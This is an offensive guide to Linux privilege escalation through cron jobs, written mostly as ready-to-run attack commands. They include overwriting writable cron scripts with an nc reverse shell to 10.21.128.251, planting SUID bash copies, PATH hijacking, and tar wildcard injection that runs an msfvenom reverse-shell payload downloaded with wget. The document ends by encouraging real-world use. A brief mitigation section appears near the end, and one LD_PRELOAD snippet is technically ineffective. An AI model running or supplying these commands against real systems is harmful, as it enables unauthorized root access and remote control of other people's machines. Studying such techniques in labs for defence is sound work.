# **Cron Job Privilege Escalation Techniques**  
*(Comprehensive Guide to Exploiting Cron Jobs for Root Access)*  

---

## **1. Understanding Cron Jobs**
### **Key Locations to Check**
```bash
cat /etc/crontab                  # System-wide cron jobs
cat /etc/cron.d/*                 # Additional cron job configurations
ls -la /etc/cron.hourly/daily/weekly/monthly  # Periodic scripts
crontab -l                        # Current user's cron jobs (if any)
```

### **Example `/etc/crontab` Analysis**
```bash
SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Scheduled Jobs:
* * * * * root overwrite.sh              # Runs every minute as root
* * * * * root /usr/local/bin/compress.sh # Runs every minute as root
```

---

## **2. Exploiting Cron Jobs**
### **A. Writable Script Exploitation**
#### **Scenario 1: `overwrite.sh` is World-Writable**
```bash
ls -la /usr/local/bin/overwrite.sh  # Check permissions
-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
```
→ **Group/Others have write access!**  

#### **Exploitation Methods**
1. **Reverse Shell Method**
   ```bash
   echo 'nc 10.21.128.251 4444 -e /bin/sh' > /usr/local/bin/overwrite.sh
   chmod +x /usr/local/bin/overwrite.sh
   ```
   - **Listener:**  
     ```bash
     nc -nvlp 4444
     ```

2. **SUID Shell Method**
   ```bash
   echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/local/bin/overwrite.sh
   chmod +x /usr/local/bin/overwrite.sh
   ```
   - **Get Root Shell:**  
     ```bash
     /tmp/bash -p  # -p preserves privileges
     ```

---

### **B. PATH Hijacking**
#### **Scenario 2: `PATH` Includes `/home/user` First**
```bash
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```
→ If `overwrite.sh` is called without full path, we can hijack it.

#### **Exploitation Steps**
1. **Create Malicious `overwrite.sh` in `/home/user`**
   ```bash
   echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
   chmod +x /home/user/overwrite.sh
   ```
2. **Wait for Cron Execution**
   ```bash
   ls -la /tmp/bash  # Check if SUID bash is created
   /tmp/bash -p      # Spawn root shell
   ```

---

### **C. Wildcard Exploitation in `compress.sh`**
#### **Scenario 3: Script Uses `tar *` with Wildcards**
```bash
cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *  # Vulnerable to wildcard injection
```

#### **Exploitation via `--checkpoint`**
1. **Generate a Reverse Shell Payload**
   ```bash
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.21.128.251 LPORT=4444 -f elf -o shell.elf
   ```
2. **Transfer Payload to Target**
   ```bash
   wget http://10.21.128.251:8000/shell.elf
   chmod +x shell.elf
   ```
3. **Exploit `tar` Wildcard Behavior**
   ```bash
   touch /home/user/--checkpoint=1
   touch /home/user/--checkpoint-action=exec=shell.elf
   ```
   - **Listener:**  
     ```bash
     nc -nvlp 4444
     ```
   → **Cron executes `tar`, triggering the payload as root!**

---

## **3. Advanced Techniques**
### **A. Using `pspy` to Monitor Hidden Cron Jobs**
```bash
wget http://10.21.128.251/pspy64
chmod +x pspy64
./pspy64
```
→ Reveals processes running as root (e.g., `compress.sh`, `overwrite.sh`).

### **B. Exploiting Environment Variables**
If `LD_PRELOAD` or `PYTHONPATH` is allowed:
```bash
echo 'int system(const char *c) { return 0; }' > /tmp/hijack.c
gcc -shared -o /tmp/hijack.so /tmp/hijack.c -fPIC
sudo LD_PRELOAD=/tmp/hijack.so /usr/local/bin/compress.sh
```

---

## **4. Mitigation & Best Practices**
### **How to Secure Cron Jobs**
1. **Use Absolute Paths**  
   ```bash
   /usr/bin/tar czf /tmp/backup.tar.gz /home/user/*
   ```
2. **Restrict File Permissions**  
   ```bash
   chmod 750 /usr/local/bin/compress.sh
   chown root:root /usr/local/bin/compress.sh
   ```
3. **Avoid Wildcards in Scripts**  
   ```bash
   tar czf /tmp/backup.tar.gz file1 file2  # Explicit files only
   ```
4. **Audit Cron Jobs Regularly**  
   ```bash
   grep -r "tar czf" /etc/cron* /var/spool/cron
   ```

---

## **5. References**
- **[GTFOBins](https://gtfobins.github.io/)** – Exploitable binaries in cron.  
- **[Cron Security Guide](https://help.ubuntu.com/community/CronHowto)** – Ubuntu cron best practices.  

---

### **Final Notes**
- **Always check `/etc/crontab` and `/etc/cron.d/` after gaining access.**  
- **If a script is writable, privilege escalation is trivial.**  
- **Wildcards in `tar`, `rsync`, or `chown` are dangerous!**  

🚀 **Next Steps**: Test these in a lab before real-world use!  

---
